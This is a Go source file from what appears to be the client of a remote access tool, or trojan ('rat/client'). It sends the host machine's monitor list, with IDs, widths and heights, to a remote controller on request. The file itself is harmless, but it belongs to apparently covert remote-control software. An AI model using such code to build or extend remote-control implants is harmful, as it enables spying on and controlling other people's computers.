package main

import (
	"rat/client/screen"
	"rat/common"
)

type MonitorsPacket struct {
}

func (packet MonitorsPacket) GetHeader() common.PacketHeader {
	return common.MonitorsHeader
}

func (packet MonitorsPacket) Write(c *Connection) error {
	screen.QueryMonitors()

	c.WriteInt(len(screen.Monitors))

	for _, monitor := range screen.Monitors {
		c.WriteInt(monitor.ID)
		c.WriteInt(monitor.Width)
		c.WriteInt(monitor.Height)
	}

	return nil
}

func (packet MonitorsPacket) Read(c *Connection) error {
	Queue <- MonitorsPacket{}
	return nil
}
